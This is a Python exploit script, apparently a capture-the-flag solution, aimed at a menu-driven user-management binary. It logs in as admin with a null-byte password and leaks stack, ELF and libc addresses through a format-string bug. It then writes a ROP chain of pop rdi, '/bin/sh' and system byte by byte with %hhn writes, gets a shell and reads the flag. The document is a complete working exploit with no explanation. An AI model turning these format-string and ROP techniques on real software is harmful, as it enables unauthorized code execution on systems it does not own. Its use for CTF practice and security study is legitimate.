#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")
context.log_level = "info"

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    ru(b"Enter choice:")
    sl(i2b(choice))


admin_usrname = b"MrAlphaQ"
admin_pass = b"\x00"


def choice_1():
    cmd(1)
    ru(b"what do you want to do here?\n")
    sl(b"manage users\x00")
    ru(b"Enter username: ")
    sl(admin_usrname)
    ru(b"Enter password: ")
    sl(admin_pass)


def add_user(name, desc, passwd=b"exl"):
    cmd(2)
    assert len(name) <= 30 and len(desc) <= 305
    ru(b"Enter username: ")
    sl(name)
    ru(b"Enter password: ")
    sl(passwd)
    ru(b"Enter description: ")
    sl(desc)
    ru(b"successfully")


def admin_login():
    while True:
        choice_1()
        if not b"Wrong" in ru(b"1. Admin login"):
            break


def view_user(name, passwd=b"exl"):
    cmd(4)
    cmd(3)
    ru(b"Enter username: ")
    sl(name)
    ru(b"Enter password: ")
    sl(passwd)
    cmd(5)
    ru(b"The description for: ")
    # res1 = ru(b" is: ", drop=True)
    # res2 = ru(b"\n1. Admin login", drop=True)
    # return res1, res2


admin_login()

# Leak first
#   .stack.elf.libc
name0 = b".%46$p.%2$p.%3$p."
add_user(name0, b"abc")
view_user(name0)
ru(b".")
stack_base = int(ru(b".", drop=True), 16) - 0x20
elf_base = int(ru(b".", drop=True), 16) - 0x5060
libc_base = int(ru(b".", drop=True), 16) - 0x114887
lg("stack_base", stack_base)
lg("elf_base", elf_base)
lg("libc_base", libc_base)

pop_rdi_ret = libc_base + 0x000000000002A3E5

cmd(4)
admin_login()
fmt = strFmt()
name1 = fmt.generate_hhn_payload(0x128, 0x25)
name1 += fmt.generate_hhn_payload(0x120, ((pop_rdi_ret) & 0xFF))

fmt = strFmt()
desc = fmt.generate_hhn_payload(0x118, ((pop_rdi_ret >> 8) & 0xFF))
desc += fmt.generate_hhn_payload(0x110, ((pop_rdi_ret >> 16) & 0xFF))
desc += fmt.generate_hhn_payload(0x108, ((pop_rdi_ret >> 24) & 0xFF))
desc += fmt.generate_hhn_payload(0x100, (0x00))

desc += fmt.generate_hhn_payload(
    0xF8 + 8 - 8 * 1, ((libc_base + next(libc.search(b"/bin/sh\x00"))) & 0xFF)
)
desc += fmt.generate_hhn_payload(
    0xF8 + 8 - 8 * 2, (((libc_base + next(libc.search(b"/bin/sh\x00"))) >> 8) & 0xFF)
)
desc += fmt.generate_hhn_payload(
    0xF8 + 8 - 8 * 3, (((libc_base + next(libc.search(b"/bin/sh\x00"))) >> 16) & 0xFF)
)
desc += fmt.generate_hhn_payload(
    0xF8 + 8 - 8 * 4, (((libc_base + next(libc.search(b"/bin/sh\x00"))) >> 24) & 0xFF)
)
desc += fmt.generate_hhn_payload(
    0xF8 + 8 - 8 * 5, (((libc_base + next(libc.search(b"/bin/sh\x00"))) >> 32) & 0xFF)
)
desc += fmt.generate_hhn_payload(
    0xF8 + 8 - 8 * 6, (((libc_base + next(libc.search(b"/bin/sh\x00"))) >> 40) & 0xFF)
)

desc += fmt.generate_hhn_payload(0xC8 - 8 * 0, 0xFF)
desc += b"a" + fmt.generate_hhn_payload(0xC8 - 8 * 1, 0xFF - 1)
desc += b"a" + fmt.generate_hhn_payload(0xC8 - 8 * 2, 0xFF - 2)
desc += b"a" + fmt.generate_hhn_payload(0xC8 - 8 * 3, 0xFF - 3)

# desc += fmt.generate_hhn_payload(
#     0xF8 - 0x8 * 6 - 8 * 1, (libc_base + libc.sym.system) & 0xFF
# )
# desc += fmt.generate_hhn_payload(
#     0xF8 - 0x8 * 6 - 8 * 2, ((libc_base + libc.sym.system) >> 8) & 0xFF
# )
# desc += fmt.generate_hhn_payload(
#     0xF8 - 0x8 * 6 - 8 * 3, ((libc_base + libc.sym.system) >> 16) & 0xFF
# )
# desc += fmt.generate_hhn_payload(
#     0xF8 - 0x8 * 6 - 8 * 4, ((libc_base + libc.sym.system) >> 24) & 0xFF
# )
# desc += fmt.generate_hhn_payload(
#     0xF8 - 0x8 * 6 - 8 * 5, ((libc_base + libc.sym.system) >> 32) & 0xFF
# )
# desc += fmt.generate_hhn_payload(
#     0xF8 - 0x8 * 6 - 8 * 6, ((libc_base + libc.sym.system) >> 40) & 0xFF
# )


lg("desc", len(desc))
lg("desc", 8 * 16)
desc = desc.ljust(0x130 - 8 * 16, b"\x00")
desc += flat(
    [
        elf_base + 0x5010 + 3,
        elf_base + 0x5010 + 2,
        elf_base + 0x5010 + 1,
        elf_base + 0x5010 + 0,
        stack_base + 0x30 + 5,
        stack_base + 0x30 + 4,
        stack_base + 0x30 + 3,
        stack_base + 0x30 + 2,
        stack_base + 0x30 + 1,
        stack_base + 0x30,
        elf_base + 0x533C,
        stack_base + 0x28 + 3,
        stack_base + 0x28 + 2,
        stack_base + 0x28 + 1,
        stack_base + 0x28,
        stack_base - 0x140,
    ]
)
desc = b"\x00" + desc[1:]
lg("name1", len(name1))
add_user(name1, desc)
view_user(name1)


fmt = strFmt()
name1 = fmt.generate_hhn_payload(0x128, 0x25)
name1 += fmt.generate_hhn_payload(0x120, ((pop_rdi_ret) & 0xFF))

fmt = strFmt()
desc = fmt.generate_hhn_payload(0x118, ((pop_rdi_ret >> 8) & 0xFF))
desc += fmt.generate_hhn_payload(0x110, ((pop_rdi_ret >> 16) & 0xFF))
desc += fmt.generate_hhn_payload(0x108, ((pop_rdi_ret >> 24) & 0xFF))
desc += fmt.generate_hhn_payload(0x100, (0x00))

desc += fmt.generate_hhn_payload(0xF8 + 8 - 8 * 1, ((pop_rdi_ret + 1) & 0xFF))
desc += fmt.generate_hhn_payload(0xF8 + 8 - 8 * 2, (((pop_rdi_ret + 1) >> 8) & 0xFF))
desc += fmt.generate_hhn_payload(0xF8 + 8 - 8 * 3, (((pop_rdi_ret + 1) >> 16) & 0xFF))
desc += fmt.generate_hhn_payload(0xF8 + 8 - 8 * 4, (((pop_rdi_ret + 1) >> 24) & 0xFF))
desc += fmt.generate_hhn_payload(0xF8 + 8 - 8 * 5, (((pop_rdi_ret + 1) >> 32) & 0xFF))
desc += fmt.generate_hhn_payload(0xF8 + 8 - 8 * 6, (((pop_rdi_ret + 1) >> 40) & 0xFF))

desc += fmt.generate_hhn_payload(0xC8 - 8 * 0, 0xFF)
desc += b"a" + fmt.generate_hhn_payload(0xC8 - 8 * 1, 0xFF - 1)
desc += b"a" + fmt.generate_hhn_payload(0xC8 - 8 * 2, 0xFF - 2)
desc += b"a" + fmt.generate_hhn_payload(0xC8 - 8 * 3, 0xFF - 3)

# desc += fmt.generate_hhn_payload(
#     0xF8 - 0x8 * 6 - 8 * 1, (libc_base + libc.sym.system) & 0xFF
# )
# desc += fmt.generate_hhn_payload(
#     0xF8 - 0x8 * 6 - 8 * 2, ((libc_base + libc.sym.system) >> 8) & 0xFF
# )
# desc += fmt.generate_hhn_payload(
#     0xF8 - 0x8 * 6 - 8 * 3, ((libc_base + libc.sym.system) >> 16) & 0xFF
# )
# desc += fmt.generate_hhn_payload(
#     0xF8 - 0x8 * 6 - 8 * 4, ((libc_base + libc.sym.system) >> 24) & 0xFF
# )
# desc += fmt.generate_hhn_payload(
#     0xF8 - 0x8 * 6 - 8 * 5, ((libc_base + libc.sym.system) >> 32) & 0xFF
# )
# desc += fmt.generate_hhn_payload(
#     0xF8 - 0x8 * 6 - 8 * 6, ((libc_base + libc.sym.system) >> 40) & 0xFF
# )


lg("desc", len(desc))
lg("desc", 8 * 16)
desc = desc.ljust(0x130 - 8 * 16, b"\x00")
desc += flat(
    [
        elf_base + 0x5010 + 3,
        elf_base + 0x5010 + 2,
        elf_base + 0x5010 + 1,
        elf_base + 0x5010 + 0,
        stack_base + 0x38 + 5,
        stack_base + 0x38 + 4,
        stack_base + 0x38 + 3,
        stack_base + 0x38 + 2,
        stack_base + 0x38 + 1,
        stack_base + 0x38,
        elf_base + 0x533C,
        stack_base + 0x28 + 3,
        stack_base + 0x28 + 2,
        stack_base + 0x28 + 1,
        stack_base + 0x28,
        stack_base - 0x140,
    ]
)
desc = b"\x00" + desc[1:]
lg("name1", len(name1))
add_user(name1, desc)
view_user(name1)

fmt = strFmt()
name1 = fmt.generate_hhn_payload(0x128, 0x25)
name1 += fmt.generate_hhn_payload(0x120, ((pop_rdi_ret) & 0xFF))

fmt = strFmt()
desc = fmt.generate_hhn_payload(0x118, ((pop_rdi_ret >> 8) & 0xFF))
desc += fmt.generate_hhn_payload(0x110, ((pop_rdi_ret >> 16) & 0xFF))
desc += fmt.generate_hhn_payload(0x108, ((pop_rdi_ret >> 24) & 0xFF))
desc += fmt.generate_hhn_payload(0x100, (0x00))

desc += fmt.generate_hhn_payload(
    0xF8 + 8 - 8 * 1, ((libc_base + libc.sym.system) & 0xFF)
)
desc += fmt.generate_hhn_payload(
    0xF8 + 8 - 8 * 2, (((libc_base + libc.sym.system) >> 8) & 0xFF)
)
desc += fmt.generate_hhn_payload(
    0xF8 + 8 - 8 * 3, (((libc_base + libc.sym.system) >> 16) & 0xFF)
)
desc += fmt.generate_hhn_payload(
    0xF8 + 8 - 8 * 4, (((libc_base + libc.sym.system) >> 24) & 0xFF)
)
desc += fmt.generate_hhn_payload(
    0xF8 + 8 - 8 * 5, (((libc_base + libc.sym.system) >> 32) & 0xFF)
)
desc += fmt.generate_hhn_payload(
    0xF8 + 8 - 8 * 6, (((libc_base + libc.sym.system) >> 40) & 0xFF)
)

desc += fmt.generate_hhn_payload(0xC8 - 8 * 0, 0xFF)
desc += b"a" + fmt.generate_hhn_payload(0xC8 - 8 * 1, 0xFF - 1)
desc += b"a" + fmt.generate_hhn_payload(0xC8 - 8 * 2, 0xFF - 2)
desc += b"a" + fmt.generate_hhn_payload(0xC8 - 8 * 3, 0xFF - 3)

# desc += fmt.generate_hhn_payload(
#     0xF8 - 0x8 * 6 - 8 * 1, (libc_base + libc.sym.system) & 0xFF
# )
# desc += fmt.generate_hhn_payload(
#     0xF8 - 0x8 * 6 - 8 * 2, ((libc_base + libc.sym.system) >> 8) & 0xFF
# )
# desc += fmt.generate_hhn_payload(
#     0xF8 - 0x8 * 6 - 8 * 3, ((libc_base + libc.sym.system) >> 16) & 0xFF
# )
# desc += fmt.generate_hhn_payload(
#     0xF8 - 0x8 * 6 - 8 * 4, ((libc_base + libc.sym.system) >> 24) & 0xFF
# )
# desc += fmt.generate_hhn_payload(
#     0xF8 - 0x8 * 6 - 8 * 5, ((libc_base + libc.sym.system) >> 32) & 0xFF
# )
# desc += fmt.generate_hhn_payload(
#     0xF8 - 0x8 * 6 - 8 * 6, ((libc_base + libc.sym.system) >> 40) & 0xFF
# )


lg("desc", len(desc))
lg("desc", 8 * 16)
desc = desc.ljust(0x130 - 8 * 16, b"\x00")
desc += flat(
    [
        elf_base + 0x5010 + 3,
        elf_base + 0x5010 + 2,
        elf_base + 0x5010 + 1,
        elf_base + 0x5010 + 0,
        stack_base + 0x40 + 5,
        stack_base + 0x40 + 4,
        stack_base + 0x40 + 3,
        stack_base + 0x40 + 2,
        stack_base + 0x40 + 1,
        stack_base + 0x40,
        elf_base + 0x533C,
        stack_base + 0x28 + 3,
        stack_base + 0x28 + 2,
        stack_base + 0x28 + 1,
        stack_base + 0x28,
        stack_base - 0x140,
    ]
)
desc = b"\x00" + desc[1:]
lg("name1", len(name1))
add_user(name1, desc)
view_user(name1)

cmd(6)
sl(b"cat flag*")

ia()
